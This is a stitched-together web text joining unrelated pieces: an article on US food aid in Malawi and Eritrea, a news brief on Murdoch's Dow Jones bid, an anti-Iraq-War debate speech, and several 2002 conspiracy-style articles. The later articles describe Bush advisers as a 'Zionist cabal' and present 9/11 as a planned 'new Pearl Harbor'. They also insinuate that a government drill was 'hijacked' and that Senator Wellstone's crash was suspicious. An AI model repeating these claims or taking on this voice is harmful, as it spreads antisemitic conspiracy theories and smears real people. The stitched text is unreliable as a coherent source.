This is eminently sensible - emergency food sourced in the US takes more than four months , on average , to arrive , whereas cash spent locally can deliver food within weeks .
But the suggestion has twice been knocked back by Congress , driven by a powerful lobby of agribusiness and the shipping industry .
The debate will gather steam over the summer as this year 's US Farm Bill is debated .
But in any case , as the US department of agriculture told me , school feeding programmes will continue to be supplied with American food - enough for 437,000 children in Malawi this year .
Why - with a bumper crop and Malawian corn a fifth the price of American ?
That 's the policy , they said - ' Food aid in kind is valid and effective ' .
Increasingly , it seems , the developing world may take matters into its own hands .
One government official in Malawi told me that ministries there had not been informed about the latest US grant , and would be very unhappy about it .
Last year Eritrea , a food - aid addict for all of the country 's brief and tragic history , declared that , for the dignity of its people and in order to end ' a culture of dangerous dependency ' , it would accept no more food aid .
Back in Malawi , Oxfam's Mary Khozombah works in the countryside around Blantyre helping farmers secure a stable way of life and adequate income .
A native of Zimbabwe , she 's seen the dire ill effects brought about by ill - advised agricultural policies in Southern Africa .
' People who want to help Malawi need to support agriculture by educating farmers , improving irrigation , helping people find other forms of income .
We need empowerment so our farmers can export .
Ask us !
We might come up with good ideas .
' Food aid , ' she says forcefully , ' should be the last resort , in an emergency - and even then it should be bought locally if possible .
Of course , if people say we want to give you food , we 'll say yes - you can't say no .
Poor nations like us too often just accept the charity without looking properly at the effects .
But in the long term it really kills our people . '
Just say no how Eritrea refused food aid
In May 2006 , at the height of the drought in the Horn and East of Africa , Eritrea declared it wanted no more foreign food aid .
The government had already halted the distribution of free food to all but a few thousand people and removed the operating licences of three international aid agencies involved in food handouts .
It had locked the warehouses containing 100,000 tonnes of United Nations World Food Programme stocks .
No longer , said the government in a lengthy statement posted on its official website , would the people of Eritrea be able to see free food 'as a permanent factor in their life and even as a " right or natural entitlement " . '
It was a move that shocked observers .
At the end of last year , the UN had predicted that the drought would mean two - thirds of Eritrea 's 3.6 million people would need food aid during 2006 ; 1.3 million people were receiving supplementary food aid in late 2005 .
But the government of Isaias Afewerki , the charismatic former guerrilla leader who led Eritrea 's independence battle with Ethiopia , was adamant .
If countries wanted to give aid , then cash would be acceptable .
This would be used to pay the poor for work , which would enable them to buy food .
Much of Eritrea has been fed by outsiders for all of the 13 years of the country 's existence .
Years of free food aid , according to the government , had begun ' to foster a culture of dangerous dependency ' in the country .
It had ' nurtured lethargy , debilitating idleness and unemployment ' and eroded the ' industriousness and hard work ethics of communities ' .
Reaction to the Eritrean move was surprisingly muted .
A senior UN official flew to Asmara to ask what was happening to the food in the warehouses , and found that the government was considering selling it , and using the cash to pay people who would have received it in return for work .
The aid agencies , however , refrained from criticism - chiefly because Afewerki and his ministers were repeating what aid analysts have been saying for years .
Who gives and who gets in the world of food aid
In 2005 , 93 countries or territories received a total of 8.25 million tonnes of food aid .
More than half of it went to sub-Saharan Africa .

Story on Murdoch purchase of Wall Street Journal ' incorrect '
Michael Roston
Published : Friday July 6 , 2007 Print This Email This
A spokesman with the company that owns the Wall Street Journal contested the accuracy of a Friday report from a British magazine that News Corporation Chairman Rupert Murdoch succeed in purchasing the most prestigious of American business newspapers .
" That story is incorrect , " said Howard Hoffman of Dow Jones Corporate Communications in a Monday morning phone call to RAW STORY .
Dow Jones owns the Wall Street Journal in addition to a variety of other publications and news services .
Hoffman declined to offer any further clarification of his remarks .
The Business , a British news magazine , reported that Murdoch had reached a deal with the Bancroft family , who control the majority of Dow Jones stock .
" Rupert Murdoch has succeeded with his $ 5 billion bid for Dow Jones , owners of the Wall Street Journal , according to sources acting for the Dow Jones board , " Andrew Neil and James Forsyth reported on Friday .
" Negotiations have been completed and the board is confident the terms of the deal will be accepted by the Bancroft family , which controls a majority of voting shares in Dow Jones , over the next few days .
A formal announcement is expected next week . "
Another British paper , The Guardian , also questioned the completion of negotiations on Murdoch 's purchase of Dow Jones .
" A spokesman for the Bancroft family , which owns a controlling stake in Dow Jones , contradicted this report : ' I am reliably informed that there is no change in the status of the discussions currently under way , ' " Stephen Brook and Katie Allen reported on Friday .
" News Corporation is continuing to conduct due diligence and the negotiations are not complete . "
Sources with News Corporation and the Dow Jones Employees ' Union also denied reports that negotiations were complete to the Guardian .
DEVELOPING ...
The following is the unabridged text of my opening remarks in a debate concerning the morality of the Iraq War with Mark Overstreet , vice president and professor at Criswell College in Dallas , Tex .
The debate was held on SoapBox Radio on June 9 , 2007 .
The question of the morality of the Iraq War is not a difficult one .
It is , in fact , an open and shut case .
The war was immoral from the very beginning .
It is still immoral right now .
And anything short of immediately withdrawing U.S. troops merely continues the immorality .
The mission of the U.S. military in Iraq can never be moral , just , and consistent with the principles of Christianity .
No Christian has any business defending , supporting , or participating in the war in Iraq .
If there is any religion that should be opposed to the evils of war it is Christianity .
And if there is any group within Christianity that should be the most consistent , the most vocal , and the most scriptural in its opposition to the offensive , preemptive , open - ended , “ shock and awe ” campaign known as the Iraq War , it is conservative Christians who look to the Bible as their sole authority .
There are a number of reasons why I believe the war in Iraq is immoral .
It is immoral because it is not defensive , because of its incredible cost , because 3,500 U.S. soldiers have died for a lie , because of the tremendous death and destruction that we have meted out to Iraqis , and because the state ca n’t sanctify murder .
The war in Iraq is immoral because it is not defensive .
The essence of war is killing people and destroying property .
It is never moral to kill someone and destroy his property unless one is acting in self - defense .
The war in Iraq is anything but self - defense .
The United States invaded a sovereign country thousands of miles away that had not attacked us .
Before we invaded Iraq , not one American had been killed by an Iraqi since the last time we invaded .
But have not the Iraqis killed , injured , or maimed thousands of U.S. soldiers ?
Of course they have .
We would do the same thing to foreign troops that invaded our soil .
We can call the invasion of Iraq regime change , nation building , or gunboat diplomacy , but we certainly cannot call it self - defense .
But what about the September 11th terrorist attacks ?
What about them ?
President Bush himself has acknowledged that Iraq was not behind the September 11th terrorist attacks and was not connected with al Qaede .
A report drawn up by Cheney , Rumsfeld , and Wolfowitz for the Project for the New American Century a year before the 2001 terrorist attacks shows that Bush ’s minions were waiting for what they called a “ new Pearl Harbor ” that could be used to justify the United States taking military control of Iraq .
But what about Iraq ’s weapons of mass destruction ?
Do you mean the weapons the United States sold Iraq during the 1980s when Iraq was our ally or do you mean the non-existent weapons of mass destruction that Bush used to justify invading Iraq before he acknowledged that “ most of the intelligence turned out to be wrong ” ?
The war in Iraq is immoral because of its incredible cost .
Although then Secretary of Defense Donald Rumsfeld said that the war would cost $ 50 billion , it is now costing the American taxpayers over $ 200 million a day .
Congress just appropriated $ 100 billion to continue fighting the war this year .
The final cost of the war is projected to be has high as $ 2 trillion .
And who knows what the cost will be to provide a lifetime of medical care to the thousands of wounded and mangled U.S. troops .
There comes a time when it must be said that enough is enough .
With the national debt fast approaching $ 9 trillion , this is a war that we cannot afford .
The war in Iraq is immoral because 3,500 U.S. soldiers have died for a lie .
The U.S. military does not defend our freedoms .
Instead , it serves as the world ’s policeman , fireman , social worker , bully , and busybody .
Rather than guarding our borders , patrolling our coasts , and protecting our citizens , the Defense Department — which could n’t defend its own headquarters — is focused on fighting the next foreign war .
There are over 700 military bases on foreign soil , with U.S. troops stationed in 159 different regions of the world .
Instead of the U.S. military helping to guarantee peace and stability throughout the world , the presence of the U.S. military more often than not is the cause of war and instability around the globe .
Because of what the military has become , Christians in the military , if they want to act consistently with the principles of Christianity , need to do just one thing : get out of the military .
The war in Iraq is immoral because of the tremendous death and destruction that we have meted out to Iraqis .
After the United States invaded Iraq the first time during the 1991 Gulf War , we imposed brutal economic sanctions on Iraq that lead to the deaths of half a million infants and children .
Osama bin Laden listed these sanctions against Iraq as one of the main reasons for the September 11th attacks on the United States .
I believe the CIA term for what we experienced is blowback .
The scriptural principle is “ whatsoever a man soweth that shall he also reap . ”
But even if Iraq had not been devastated by U.S. sanctions and yet still had been directly responsible for the September 11th attacks , I fail to see how that justifies reducing the country to rubble and killing — according to the latest estimates — 600,000 people , most of whom were supposedly people who had been brutalized by Saddam Hussein .
The war in Iraq is immoral because the state can’t sanctify murder .
State - sanctified murder — can there be such a thing ?
Will it be an adequate defense at the Judgment ?
The state is responsible for more deaths throughout history than those caused by all individuals and organizations combined .
In the twentieth century alone , tens of millions of people were murdered by their own governments .
Trusting the state when it comes to the necessity of going to war is ludicrous .
Blind obedience to the state is not a tenet of New Testament Christianity .
Killing for the state in some foreign war violates the biblical precept against killing .
Limiting the biblical prohibition against killing to just murder does n’t legitimize killing in war .
Because the war in Iraq was not defensive , U.S. soldiers — many of whom would claim to be Christians — cannot claim to be acting in self - defense when they gun down Iraqis .
They are invaders and occupiers , not liberators and peacekeepers .
It is unfortunate that many Americans have the idea that a terrorist is anyone who detonates a bomb but does n’t wear an air force uniform .
The Bible says in Colossians 3:23 : “ And whatsoever ye do , do it heartily , as to the Lord , and not unto men . ”
Bombing , killing , maiming , and interrogating for the state cannot be done heartily in the name of the Lord .
Christians who do these things in the service of the state do them unto men — men like Bush , Cheney , Rumsfeld , Wolfowitz , Perle , Powell , and the other architects of the Iraq war — they do not do them for the glory of God or even for the American people .
The war in Iraq has made not made us more secure .
To the contrary , it has intensified the hatred that many foreigners around the world have for Americans , and has created terrorists faster than we can kill them .
The majority of the American people are now against this war .
Perhaps not out of principle , but at least they are against it — for whatever their reason .
Yet , support for the war among many conservative Christians continues .
I know that among Americans , and even among Christian Americans , conservative Christians are usually in the minority on many issues .
But being in the minority on a particular issue does n’t necessarily mean that one is in the right .
Just look at one person who is in the minority : George W. Bush .
Here is a professing Christian who believes that Muslims and Christians worship the same God and a Republican president who has done more to expand the power of government than any other Republican president since Abraham Lincoln .
But whether we are in the minority or the majority , conservative Christians should oppose this war , not because the war did not go as planned , not because we do n’t want another Vietnam , not because we have suffered too many casualties , not because too many Iraqi civilians have been killed , not because the war is too expensive , not because the conflict in Iraq has descended into a civil war , not because there are too many insurgents , and not because the troop surge is not working — we should oppose the war because it was a grave injustice , a monstrous wrong , and a great evil from the very beginning .

9 - 11 : The " New Pearl Harbor " of the Zionist War Plan
December 18 , 2002
As a presidential candidate , George W. Bush ’s inner cabal of Zionist war hawks signed a secret Middle East war plan in the summer of 2000 that recognized that America would need to experience a “ new Pearl Harbor ” if their drastic plans to reshape U.S. defense policy to suit Israel ’s agenda were to succeed .
The cabal of war fanatics currently advising the White House secretly planned a “ transformation ” of defense policy years ago , calling for war against Iraq and huge increases in military spending .
A “ catalyzing event – like a new Pearl Harbor ” was seen as necessary to bring about the desired transformation of the U.S. military .
The huge increases in U.S. military spending that have occurred since the terror attacks of September 11 , 2001 , were planned before President George W. Bush was elected by the same men who are pushing the administration ’s “ war on terrorism ” and the invasion and occupation of Iraq .
The huge increases in U.S. military spending that have occurred since the terror attacks of Sept. 11 , 2001 , were planned before President George W. Bush was elected by the same men who are pushing the administration 's " war on terrorism " and the invasion and occupation of Iraq .
Billions of dollars in additional defense spending are but the first step in the group 's long - term plan to transform the U.S. military into a global army enforcing a terroristic and bloody Pax Americana around the world .
A neo-conservative Washington - based organization known as the Project for the New American Century ( PNAC ) , funded by three foundations closely tied to Persian Gulf oil , weapons , and defense industries , drafted the war plan for U.S. global domination through military power .
One of the organization 's documents clearly shows that Bush and his most senior cabinet members had already planned an attack on Iraq before he took power in January 2001 .
The PNAC was founded in the spring of 1997 by the well - known Zionist neo-conservatives Robert Kagan and William Kristol of the Weekly Standard .
The PNAC is part of the New Citizenship Project , whose chairman is also William Kristol , and is described as " a non-profit , educational organization whose goal is to promote American global leadership . "
Dick Cheney , Donald Rumsfeld , Jeb Bush , and Paul Wolfowitz signed a Statement of Principles of the PNAC on June 3 , 1997 , along with many of the other current members of Bush 's " war cabinet . "
Wolfowitz was one of the directors of PNAC until he joined the Bush administration .
The group 's essential demand was for hefty increases in defense spending .
" We need to increase defense spending significantly if we are to carry out our global responsibilities today and modernize our armed forces for the future , " the statement 's first principle reads .
The increase in defense spending is to bring about two of the other principles : " to challenge regimes hostile to our interests and values " and " to accept responsibility for America 's unique role in preserving and extending an international order friendly to our security , our prosperity , and our principles . "
A subsequent PNAC plan entitled " Rebuilding America 's Defenses : Strategies , Forces and Resources for a New Century , " reveals that the current members of Bush 's cabinet had already planned , before the 2000 presidential election , to take military control of the Gulf region whether Saddam Hussein was in power or not .
The 90 - page PNAC document from September 2000 says : " The United States has for decades sought to play a more permanent role in Gulf regional security .
While the unresolved conflict with Iraq provides the immediate justification , the need for a substantial American force presence in the Gulf transcends the issue of the regime of Saddam Hussein . "
" Even should Saddam pass from the scene , " the plan says U.S. military bases in Saudi Arabia and Kuwait will remain , despite domestic opposition in the Gulf states to the permanent stationing of U.S. troops .
Iran , it says , " may well prove as large a threat to U.S. interests as Iraq has . "
" A NEW PEARL HARBOR "
A " core mission " for the transformed U.S. military is to " fight and decisively win multiple , simultaneous major theater wars , " according to the PNAC .
The strategic " transformation " of the U.S. military into an imperialistic force of global domination would require a huge increase in defense spending to " a minimum level of 3.5 to 3.8 percent of gross domestic product , adding $ 15 billion to $ 20 billion to total defense spending annually , " the PNAC plan said .
" The process of transformation , " the plan said , " is likely to be a long one , absent some catastrophic and catalyzing event — like a new Pearl Harbor . "
I asked Christopher Maletz , assistant director of the PNAC about what was meant by the need for " a new Pearl Harbor . "
" They needed more money to up the defense budget for raises , new arms , and future capabilities , " Maletz said .
" Without some disaster or catastrophic event " neither the politicians nor the military would have approved , he said .
The " new Pearl Harbor , " in the form of the terror attacks of 9 - 11 , provided the necessary catalyst to put the global war plan into effect .
Congress quickly allocated $ 40 billion to fund the " war on terrorism " shortly after 9 - 11 .
A Pentagon spokesman told me that $ 17.5 billion of that initial allocation went to defense .
The U.S. defense budget for 2002 , including a $ 14.5 billion supplement , came to $ 345.7 billion , a nearly 12 percent increase over the 2001 defense budget .
Similar significant increases in defense spending are planned for 2003 ( to $ 365 billion ) and 2004 ( to at least $ 378 billion ) in line with the PNAC plan .
“ TOTAL WAR ”
Veteran journalist John Pilger recently wrote about one of PNAC 's founding members , Richard Perle : " I interviewed Perle when he was advising Reagan , and when he spoke about ' total war , ' I mistakenly dismissed him as mad , " Pilger wrote .
" He recently used the term again in describing America 's ' war on terror . '
' No stages , ' he said .
' This is total war .
We are fighting a variety of enemies .
There are lots of them out there .
All this talk about first we are going to do Afghanistan , then we will do Iraq . . . this is entirely the wrong way to go about it .
If we just let our vision of the world go forth , and we embrace it entirely and we do n't try to piece together clever diplomacy , but just wage a total war . . . our children will sing great songs about us years from now . ' "
" This is a blueprint for U.S. world domination — a new world order of their making , " Tam Dalyell , British parliamentarian and critic of the war policy from the Labor Party said .
" These are the thought processes of fantasist Americans who want to control the world .
This is garbage from think - tanks stuffed with chicken - hawks , " Dalyell said , " men who have never seen the horror of war but are in love with the idea of war .
I am appalled that a British Labor Prime Minister should have got into bed with a crew which has this moral standing . "
Bin Laden Tape Exposed as Fake
December 10 , 2002
The most recent Osama Bin Laden tape recording is a fake , according to Swiss voice recognition experts , who are 95 percent sure the voice in the tape is that of an impostor .
A respected Swiss institute specializing in voice recognition technology analyzed the recent tape alleged to contain the voice of Osama Bin Laden and found that the voice was most likely that of an impostor .
The apparently fraudulent tape came out shortly after a 4,000 word letter allegedly written by Bin Laden appeared in Saudi Arabia .
A French television channel , France 2 , commissioned the Dalle Molle Institute for Perceptual Artificial Intelligence ( IDIAP ) of Martigny , Switzerland , to analyze the tape , which was first aired on November 12 by the Arabic language television network , Al - Jazeera .
The IDIAP , which is affiliated with the Swiss Federal Institute of Technology , specializes in speech and speaker recognition research .
The tape , which was delivered to the Qatar - based al - Jazeera , was said to provide the first concrete evidence that Bin Laden is still alive because it mentioned attacks that occurred as recently as October 28 .
The tape was reportedly recorded over the telephone .
The voice on the tape praised recent attacks including the siege of a Moscow theatre by Chechen rebels , the bombing of a French oil tanker off the coast of Yemen , and the Bali bombing .
Voice analysis tests done of the tape indicated the speaker was an impostor , according to Hervé Boulard , the institute 's director .
Boulard , told France 2 that he was 95 per cent certain that " it has not been recorded by Bin Laden . "
Boulard , who previously worked with the International Computer Science Institute in Berkeley , California , said there was a 5 percent risk of error in the institute 's conclusion that the latest tape is a fake .
Regarding the poor sound quality of the recent tape , Boulard said : " Many of our 20 [ test ] recordings were also of poor quality .
Some were very good , some very bad , but our results were all positive except in one case . "
France 2 provided IDIAP with one hour of authenticated videotape recordings of Bin Laden .
IDIAP created a computerized model of Bin Laden 's voice from the authentic recordings .
To verify the reliability , scientists tested that model with recordings from Bin Laden and others that were not .
IDIAP compared the voice on the tape with 20 authentic recordings of Bin Laden .
Boulard concluded that all the voices except that on the tape in question belonged to the same person , noting the statistical software he used has a margin of error of around five percent , France 2 reported .
While Boulard says the tape does not appear to be the voice of Osama Bin Laden , the margin of error precludes absolutely certainty .
" In order to have an irrefutable conclusion , you would need around 100 recordings of Bin Laden , " IDIAP 's researcher Samy Bengio told Swiss radio .
The IDIAP study concluded : " It is difficult to agree with some US officials saying that it is 100 percent sure that it is Bin Laden .
When addressing a problem with a scientific perspective ( as opposed to a political approach ) , one has to be ready to also accept the uncertainty of the results . "
The Swiss results challenged U.S. intelligence agency reports that the voice on the tape was Bin Laden's .
I asked Pentagon spokesman Dave Lapan if U.S. intelligence agencies believe the latest Bin Laden tape is genuine .
Lapan said , " Although it could not be confirmed with 100 percent certainty , the assessment from the intelligence community is that the tape is genuine . "
He added that he was " not aware of a different analysis from another country . "
A French news magazine , L'Express , recently reported that Bernard Gautheron , director of the phonetic testing laboratory in Paris , had concluded there was a " very strong probability " that the Al Jazeera tape was genuine .
Qatar , the home of Al Jazeera is a small emirate in the Persian Gulf described as the " nerve center of a war against Iraq . "
The Emir of Qatar , who provided funding to start Al Jazeera , has also provided the U.S. military with a command center and spent more than $ 1 billion building the Al Udeid Air Base for U.S. warplanes .
Seven hundred members of the U.S. Central Command are currently in Qatar for Exercise Internal Look , a war game to test the systems that would be used in a war against Iraq .
Legal Experts : Pre-emptive War Illegal
December 4 , 2002
Bush 's policy of " preemptive action " opens the door to global gangsterism .
Through its words and deeds the administration of President Bush has shown its intent to disregard international law and pursue a criminal policy of " preemptive action , " having adopted the Israeli term for what is otherwise known as " war of aggression . "
" The president , of course , supports preemptive action , " White House spokesman Ari Fleischer said on Dec. 2 .
" The president has said that is part of America 's doctrine because of the different nature of terrorism . "
Fleischer was responding to a reporter who had misquoted John Howard , the Australian prime minister , by saying : " Australia intended to take preemptive military action to fight terrorists in the wake of the Bali attack . "
The reporter then asked : " Does the president support the preemptive military action against terrorists in Asia ? "
Howard 's contentious remarks about preemptive action were taken out of context and resulted in a flurry of protest from a host of Asian states .
Howard had said that the UN charter on self defense needed to be amended to allow states to use preemptive action against threats of terrorism .
The UN Charter is a treaty binding upon the United and other member states .
The UN Charter prohibits the use of force by a state that is not subject to an armed attack .
Article 2 stipulates the states renounce " the threat or use of force against the territorial integrity or political independence of any state . "
Speaking about " non-state terrorism , " Howard said : " All I 'm saying - I think many people are saying - is that maybe the body of international law has to catch up with the new reality . "
I asked Francis Boyle , professor of international law at the University of Illinois , about the legal questions .
Boyle said : " Howard said that the UN charter has to be amended to allow for preemptive strikes to be legal . "
Calls to the White House were not returned .
As the judgment of the International Military Tribunal at Nuremberg in 1945 noted , " resort to a war of aggression is not merely illegal , but is criminal . "
" To initiate a war of aggression , " the tribunal declared in its judgment , " is the supreme international crime , differing only from other war crimes in that it contains within itself the accumulated evil of the whole . "
UN Security Resolution1441 , which sent the weapons inspectors back to Iraq , does not authorize any use of force against Iraq , Boyle said .
Secretary of State Colin Powell tried , and failed to get language into the resolution allowing the use of force , Boyle said .
Zionist ' Prince of Darkness ' Craves War
November 27 , 2002
The Pentagon 's top civilian security adviser told an assembly of British politicians that the United States would attack Iraq even if UN inspectors fail to find weapons of mass destruction .
Richard Perle , President Bush 's hawkish adviser known as " The Prince of Darkness , " " stunned " British parliamentarians ( MP ) by saying a " clean bill of health " from UN chief weapons inspector Hans Blix would not prevent a U.S. and British invasion of Iraq .
The provocative comments by Perle , who has been a lobbyist for an Israeli arms manufacturer , were reported in an article titled " War , Whatever " in the Mirror , a British journal , on Nov. 20 .
Former British Defense Minister and Labour Party MP Peter Kilfoyle said : " America is duping the world into believing it supports these inspections . "
President Bush intends to go to war even if inspectors find nothing .
This makes a mockery of the whole process and exposes America 's real determination to bomb Iraq , " Kilfoyle said .
The Iraqi regime is in the difficult position of having to prove a negative - that it does n't possess banned weapons .
As Perle told the MPs : " I can not see how Hans Blix can state more than he can know .
All he can know is the results of his own investigations .
And that does not prove Saddam does not have weapons of mass destruction . "
Perle , who chairs a Pentagon advisory board said : " Suppose we are able to find someone who has been involved in the development of weapons and he says there are stores of nerve agents .
But you cannot find them because they are so well hidden .
Do you actually have to take possession of the nerve agents to convince ?
We are not dealing with a situation where you can expect cooperation . "
Kilfoyle said : " Because Saddam is so hated in Iraq , it would be easy to find someone to say they witnessed weapons building .
Perle says the Americans would be satisfied with such claims even if no real evidence was produced .
That 's a terrifying prospect . "
Spy Agency's 9 -11 Drill Exposes Government Lies
November 1 , 2002
On 11 September 2001 , a key U.S. intelligence agency was running a drill in which a plane hits a government building .
While U.S. spy satellites could easily observe what actually happened in New York City and Washington , this " bizarre coincidence " sent the people who operate America 's " eye in the sky " home .
On the very day that planes struck the World Trade Center and the Pentagon , the National Reconnaissance Office ( NRO ) , the " super- secret " intelligence agency that " designs , builds , and operates U.S. reconnaissance satellites " had planned to conduct an emergency drill in which a simulated plane from the nearby Dulles International Airport would have crashed into their building .
When reality intruded in New York and Washington , the exercise was cancelled and nearly all of NRO 's three thousand employees , the people who operate the nation 's " eye in the sky , " were sent home .
The NRO , which works closely with the Dept. of Defense and CIA , had planned a simulated exercise in which a small jet " crashes " into one of the four towers at the agency 's headquarters on the morning of Sept. 11 , 2001 .
The government said it was a " bizarre coincidence " that one of the most important U.S. intelligence agencies had planned a mock plane - into - building crash on Sept. 11 , according to the Associated Press who reported the story on August 22 .
NRO headquarters are in Chantilly , Virginia , about 4 miles from the runways of Dulles airport .
The secretive NRO was created in 1960 and oversees the nation 's spy satellites for reconnaissance and defense purposes .
For the first 32 years the U.S. government even denied its existence .
The NRO recruits personnel from the military and the Central Intelligence Agency and has a budget that is estimated to equal the combined budgets of both the CIA and the National Security Agency .
The director of the NRO ( DNRO ) reports directly to the Secretary of Defense and the director of the CIA .
On 11 September 2001 the NRO director was Keith R. Hall , who had headed the agency since 1996 .
As DNRO , Hall was responsible for the acquisition and operation of all United States space - based reconnaissance and intelligence systems .
Hall also served as Assistant Secretary of the Air Force for Space until December 8 , 2001 when Peter B. Teets replaced Hall in both positions .
Hall had joined the Pentagon during the administration of George H.W. Bush , as deputy assistant secretary of defense for intelligence and security , where he remained into the Clinton administration , until then CIA Director John M. Deutch brought him to the CIA .
Hall crafted Deutch 's plan to create a new spy bureaucracy in the Pentagon , the National Imagery and Mapping Agency ( NIMA ) by merging the CIA 's center for interpreting spy satellite imagery with the Defense Mapping Agency .
" As Director , NRO , I have responsibility for the design , acquisition , and operations of all the nation 's reconnaissance satellites , reporting to the Secretary of Defense and the Director of Central Intelligence , " Hall told the Senate subcommittee on strategic forces in 1999 .
The fact that the NRO had planned a scenario on 9 - 11 that was remarkably similar to what actually happened exposes the lie by some senior administration officials who claimed the events of 9/11 had not been foreseen .
The " bizarre co-incidence " between the planned exercise and the grim reality suggests that the " game " was hijacked by unknown agents who overlaid it with a lethal scheme in the same way that former Israeli prime minister , Yitzhak Rabin , was assassinated during what was meant to be a security exercise .
The existence of the NRO 's pre-planned plane - attack simulation was first revealed in an announcement of a recent National Law Enforcement and Security Institute conference in Chicago .
In a promotion for speaker John Fulton , a CIA officer assigned as chief of NRO 's strategic gaming division , the announcement read : " On the morning of September 11th 2001 , Mr. Fulton and his team ... were running a pre-planned simulation to explore the emergency response issues that would be created if a plane were to strike a building .
Little did they know that the scenario would come true in a dramatic way that day . "
It was American Airlines Flight 77 , a Boeing 767 , which took off from Dulles at 8:10 a.m. , 50 minutes before the NRO exercise was to begin , that reportedly struck the Pentagon on Sept. 11 .
The Pentagon was hit between 9:30 and 9:40 a.m. with 125 deaths on the ground and 64 reported on the plane .
The NRO scenario was planned to test employees ' ability to respond to a disaster , according to Art Haubold , spokesman for the agency .
No actual plane was to be involved .
To simulate the damage from the crash , some stairwells and exits were to be closed off , forcing employees to find other ways to evacuate the building .
Haubold told me that is was meant to be a " make believe " drill , " like the fire drills we did as kids in school . "
I asked Haubold why NRO 's staff was sent home when there was no apparent imminent danger .
Haubold said NRO employees had been sent home as federal workers in Washington had .
A spokesperson at NIMA in Bethesda , Md. , however , said that NIMA personnel had remained on the job on 9 - 11 .
NIMA is headed by Lt. Gen. James R. Clapper ( USAF Ret . ) .
Asked about how many people at the Dept. of Defense and CIA had been made aware of the planned exercise , Haubold said that the Pentagon and the CIA were aware of the drill , which he called a " contingency response " test .
Pentagon spokesman Ken McClellan could not say whether Secretary of Defense Donald Rumsfeld was aware of the exercise at NRO .
However , regarding the threat of an airplane attack at the Pentagon or the World Trade Center , McClellan said , " people were prescient . "
" It was just an incredible coincidence that this happened to involve an aircraft crashing into our facility , " Haubold told the AP .
" As soon as the real world events began , we canceled the exercise . "
While the story of the " bizarre coincidence " is of obvious interest , it has been removed from news websites where it appeared in late August .
CNN and the Seattle Post - Intelligencer , for example , have both removed the story .
On Sept. 11 , almost all of the 3,000 people who work at NRO headquarters were sent home , according to Art Haubold , NRO spokesman .
Haubold said that after 10:30 a.m. the only people who remained at the agency were " mission essential " personnel .
The Death of a Senator and 9 - 11 : The Uncanny Connections
November 1 , 2002
The untimely death of Minnesota 's populist senator in a suspicious plane crash 11 days before Election Day reveals several bizarre and uncanny connections to 9/11 .
The mysterious plane crash that took the life of U.S. Sen .
Paul Wellstone , the populist Democrat from Minnesota known for his opposition to waging war in Iraq , immediately raised suspicions of foul play in the North Star state .
A poster hanging in Minneapolis asked : " Who killed Paul Wellstone ? "
Since the crash , uncanny links have surfaced connecting the World Trade Center attack , the co-pilot of Wellstone 's plane , and the " elite " FBI Evidence Response Team that investigated the wreck .
On Friday , October 25 , the plane carrying the incumbent Sen .
Wellstone , his wife , daughter , and three campaign workers , crashed into the woods after veering 2 miles off course on its approach to the Eveleth - Virginia municipal airport in the remoteness of the Iron Range north of Duluth , Minnesota .
Eleven days before the election Wellstone was reported to be leading 47 - 41 in the polls and gaining over his Republican challenger , Norm Coleman .
There has been no explanation given for why the chartered twin engine Beech King Air A100 with a pilot and a co-pilot , veered sharply to the south as it approached the runway from the east .
Although the plane was carrying a U.S. senator , it had neither a cockpit voice nor a flight data recorder .
At 10:22 in the morning , as the King Air A100 approached Eveleth airport , visibility was between 3 and 4.5 miles with overcast cloud ceiling at 700 feet .
Winds were calm and the temperature was 1 - 2 degrees C .
There was light snow falling but flying conditions were generally good , according to local pilots .
I spoke with Gary Ulman , professional pilot and assistant manager of the Eveleth airport .
Ulman heard radio reports that a plane was missing and took off about 10:55 to look .
He said that while he saw " light bluish - grayish smoke " coming up from the trees 2.1 miles south of the airport , he did n't think that it could be the plane because " that was way too far off course . "
I asked Ulman several times to clarify the color of the smoke because his description of " light blue " smoke coming from the crash site is different from the expected thick black smoke that is usually seen coming from fires in which aviation fuel is the primary substance burning .
Ulman flew over the smoke and said that he saw a " hot and intense fire " consuming the plane 's fuselage on the ground .
He returned to the airport and took the local fire chief up to survey the crash site and determine how to access the wreck from the ground .
Ulman said that on this flight , at about 11:15 a.m. , he saw that the burning fuselage had nearly " disintegrated . "
The plane 's tail and wings had been detached from the body of the plane , he said .
It is important to note that the King Air 's fuel tanks are located in the wings of the plane ; there is no fuel tank in the fuselage .
While some reports suggested that icing on the plane caused the crash , Ulman and other pilots doubt that ice played a role .
Frank Matthews , a local pilot , said that the King Air is " a great all weather plane " that has " an outstanding safety record . "
Ulman said that if icing were a factor it would have caused problems at least 10 minutes earlier as the plane descended from 14,000 feet .
FAA spokeswoman , Elizabeth Isham Cory , said there did n't appear to be any sign of distress coming from the plane 's crew on its final approach to the airport .
I spoke with Rick Wahlberg , sheriff of St. Louis County , who said that local police and FBI agents reached the remote crash site " at about 12 " [ noon ] .
Paul McCabe , special agent and spokesman for the FBI 's Minneapolis division , told me that the FBI 's Evidence Response Team ( ERT ) drove to the site from the Twin Cities and arrived at the crash scene about 3 p.m. on Oct. 25 .
McCabe said that the FBI was treating the site as a " crime scene " but that there were " no indications of any criminal activity " causing the crash .
The ERT worked at the scene all day before a team of National Traffic Safety Board ( NTSB ) investigators arrived from Washington that night .
Agents from the FBI 's Minneapolis Evidence Response Team have been accused of stealing evidence from the site of the World Trade Center , where they had been sent to investigate .
The stolen evidence was a valuable Tiffany crystal paperweight taken from a WTC evidence bag .
FBI agent Jane Turner , assigned to the Minneapolis field office , reported the suspected theft .
Turner decided to blow the whistle after FBI officials declined to investigate the matter .
Turner first wrote Inspector General Glenn Fine on the anniversary of the Sept. 11 attacks that an elite FBI " evidence response team " from Minneapolis may have stolen a Tiffany crystal globe from the ruins of the World Trade Center .
She said she spotted the globe , worth more than $ 5,000 , sitting on a secretary 's desk .
Citing the ongoing investigation of her allegations , FBI officials have declined to discuss the circumstances under which the globe was taken or to explain why an allegedly stolen item would be displayed so prominently in a law enforcement office .
Turner , a 24 - year FBI veteran , was investigating a company in the theft of several items from ground zero when she discovered that Minneapolis agents assigned to an Evidence Response Team ( ERT ) at the World Trade Center had taken the globe .
" The ERT is supposed to secure and collect evidence at a crime scene .
Their job is to preserve the integrity of a crime scene , not take from it and disrupt it , " Sen .
Charles E. Grassley of Iowa , said about the accusations , which he said had been referred to the Justice Department 's Office of Inspector General .
" I think it 's outrageous , " Grassley said .
" Maybe some people who work at these scenes think that taking something is OK , like it 's a trophy for their hard work .
" This makes me wonder what else these agents stole , if they were generous enough to give an expensive crystal globe to a secretary , " he said .
Turner is the second Minneapolis agent to accuse bureau personnel of wrongdoing .
